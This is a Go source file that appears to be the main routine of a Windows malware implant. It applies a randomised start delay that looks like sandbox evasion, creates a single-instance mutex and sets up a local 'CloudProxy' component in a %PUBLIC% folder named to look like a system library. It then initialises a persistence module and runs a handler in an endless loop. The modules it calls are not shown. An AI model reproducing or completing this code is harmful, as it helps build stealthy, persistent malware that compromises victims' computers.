package main

import (
	crand "crypto/rand"
	"fmt"
	"math"
	"math/big"
	"math/rand"
	"net/http"
	"os"
	"syscall"
	"time"
	"unsafe"
)

var tag = "winhttp"

func main() {
	time.Sleep(time.Second)
	seed, _ := crand.Int(crand.Reader, big.NewInt(math.MaxInt64))
	rand.Seed(seed.Int64())
	time.Sleep(time.Second * time.Duration(rand.Intn(10)+20))
	if _, err := CreateMutex("tag"); err != nil {
		os.Exit(0)
	}

	if !CloudProxyExist() {
		for {
			err := SetupCloudProxy()
			if err == nil {
				break
			}
			fmt.Println(err)
			err = os.RemoveAll(os.Getenv("public") + "\\" + tag)
			if err != nil {
				fmt.Println(err)
				os.Exit(0)
			}
		}
		errorChan := make(chan error)
		go CloudProxy(errorChan)
		go func(errChan <-chan error) {
			for {
				err := <- errChan
				if err != nil {
					fmt.Println(err)
					os.Exit(0)
				}
			}
		}(errorChan)
		time.Sleep(time.Second * 3)
	}

	var config Config
	var persistence Persistence
	err := config.Init()
	if err != nil {
		fmt.Println(err)
		os.Exit(0)
	}
	err = persistence.Init(config)
	if err != nil {
		fmt.Println(err)
		os.Exit(0)
	}
	for {
		err = mainFunc(config)
		if err != nil {
			fmt.Println(err)
		}
		time.Sleep(time.Second * 10)
	}
}

func CreateMutex(name string) (uintptr, error) {
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	procCreateMutex := kernel32.NewProc("CreateMutexW")
	ptrName, err := syscall.UTF16PtrFromString(name)
	if err != nil {
		return 0, err
	}
	ret, _, err := procCreateMutex.Call(
		0,
		0,
		uintptr(unsafe.Pointer(ptrName)),
	)
	switch int(err.(syscall.Errno)) {
	case 0:
		return ret, nil
	default:
		return ret, err
	}
}

func CloudProxyExist() bool {
	request, err := http.NewRequest("POST", "http://localhost:8082/v1", nil)
	if err != nil {
		return false
	}
	request.Header.Add("Content-Type", "application/json")

	client := http.Client{
		Timeout: time.Minute * 5,
	}
	_, err = client.Do(request)
	if err != nil {
		return false
	} else {
		return true
	}
}

func mainFunc(config Config) error {
	var handler Handler
	err := handler.Init(config)
	return err
}
